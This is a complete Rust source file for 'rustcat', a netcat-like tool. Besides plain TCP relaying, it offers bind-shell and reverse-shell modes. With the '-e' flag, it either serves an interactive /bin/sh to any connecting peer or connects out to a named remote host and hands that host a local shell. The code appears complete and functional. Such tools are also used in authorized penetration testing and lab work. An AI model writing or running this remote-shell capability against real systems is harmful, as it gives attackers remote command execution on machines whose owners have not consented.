use clap::{Parser, Subcommand};
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;

/// rustcat – a netcat-like tool with direct-connect and reverse-shell modes
#[derive(Parser, Debug)]
#[command(
    name = "rustcat",
    author,
    version,
    about = "netcat-like utility with direct-connect and reverse-shell modes"
)]
struct Cli {
    #[command(subcommand)]
    mode: Mode,
}

#[derive(Subcommand, Debug)]
enum Mode {
    /// Listen on a port and optionally execute a shell (bind shell)
    Listen {
        /// Port to listen on
        #[arg(short, long, default_value = "4444")]
        port: u16,

        /// Spawn a shell and pipe I/O through the connection (bind shell)
        #[arg(short = 'e', long)]
        exec: bool,

        /// Shell to use when -e is set
        #[arg(long, default_value = "/bin/sh")]
        shell: String,
    },

    /// Connect to a remote host (direct connect or reverse shell)
    Connect {
        /// Remote host
        host: String,

        /// Remote port
        #[arg(default_value = "4444")]
        port: u16,

        /// Spawn a local shell and forward it to the remote listener (reverse shell)
        #[arg(short = 'e', long)]
        exec: bool,

        /// Shell to use when -e is set
        #[arg(long, default_value = "/bin/sh")]
        shell: String,
    },
}

// ── helpers ──────────────────────────────────────────────────────────────────

fn relay_stdin_to<W: Write + Send + 'static>(mut writer: W) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut buf = [0u8; 1024];
        let stdin = io::stdin();
        let mut lock = stdin.lock();
        loop {
            match lock.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if writer.write_all(&buf[..n]).is_err() { break; }
                    let _ = writer.flush();
                }
            }
        }
    })
}

fn relay_to_stdout<R: Read + Send + 'static>(mut reader: R) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut buf = [0u8; 1024];
        let stdout = io::stdout();
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    let mut out = stdout.lock();
                    if out.write_all(&buf[..n]).is_err() { break; }
                    let _ = out.flush();
                }
            }
        }
    })
}

fn pipe<R, W>(mut src: R, mut dst: W, label: &'static str) -> thread::JoinHandle<()>
where R: Read + Send + 'static, W: Write + Send + 'static
{
    thread::spawn(move || {
        let mut buf = [0u8; 1024];
        loop {
            match src.read(&mut buf) {
                Ok(0) | Err(_) => { eprintln!("[rustcat] pipe '{label}' closed"); break; }
                Ok(n) => {
                    if dst.write_all(&buf[..n]).is_err() { break; }
                    let _ = dst.flush();
                }
            }
        }
    })
}

// ── plain I/O relay ───────────────────────────────────────────────────────────

fn handle_plain(stream: TcpStream) {
    let reader = stream.try_clone().expect("clone stream");
    let t1 = relay_stdin_to(stream);
    let t2 = relay_to_stdout(reader);
    let _ = t1.join();
    let _ = t2.join();
}

// ── shell relay (bind or reverse) ─────────────────────────────────────────────

fn handle_shell(stream: TcpStream, shell: &str) {
    let mut child = Command::new(shell)
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|e| { eprintln!("[rustcat] failed to spawn shell: {e}"); std::process::exit(1); });

    let child_stdin  = child.stdin.take().expect("child stdin");
    let child_stdout = child.stdout.take().expect("child stdout");
    let child_stderr = child.stderr.take().expect("child stderr");

    let net_clone = Arc::new(Mutex::new(stream.try_clone().expect("clone net")));

    // net → shell stdin
    let t1 = pipe(stream, child_stdin, "net→stdin");

    // shell stdout → net
    let t2 = { let w = net_clone.lock().unwrap().try_clone().expect("w1"); pipe(child_stdout, w, "stdout→net") };

    // shell stderr → net
    let t3 = { let w = net_clone.lock().unwrap().try_clone().expect("w2"); pipe(child_stderr, w, "stderr→net") };

    let _ = t1.join();
    let _ = t2.join();
    let _ = t3.join();
    let _ = child.wait();
}

// ── modes ─────────────────────────────────────────────────────────────────────

fn listen_mode(port: u16, exec: bool, shell: &str) {
    let addr = format!("0.0.0.0:{port}");
    let listener = TcpListener::bind(&addr).unwrap_or_else(|e| {
        eprintln!("[rustcat] cannot bind {addr}: {e}"); std::process::exit(1);
    });
    println!("[rustcat] listening on {addr}");

    for stream in listener.incoming() {
        match stream {
            Err(e) => eprintln!("[rustcat] accept error: {e}"),
            Ok(s) => {
                let peer = s.peer_addr().map(|a| a.to_string()).unwrap_or_default();
                println!("[rustcat] connection from {peer}");
                if exec { handle_shell(s, shell); } else { handle_plain(s); }
                println!("[rustcat] connection closed");
            }
        }
    }
}

fn connect_mode(host: &str, port: u16, exec: bool, shell: &str) {
    let addr = format!("{host}:{port}");
    let stream = TcpStream::connect(&addr).unwrap_or_else(|e| {
        eprintln!("[rustcat] cannot connect to {addr}: {e}"); std::process::exit(1);
    });
    println!("[rustcat] connected to {addr}");
    if exec { println!("[rustcat] spawning reverse shell ({shell})..."); handle_shell(stream, shell); }
    else { handle_plain(stream); }
}

// ── main ──────────────────────────────────────────────────────────────────────

fn main() {
    let cli = Cli::parse();
    match cli.mode {
        Mode::Listen { port, exec, shell } => listen_mode(port, exec, &shell),
        Mode::Connect { host, port, exec, shell } => connect_mode(&host, port, exec, &shell),
    }
}
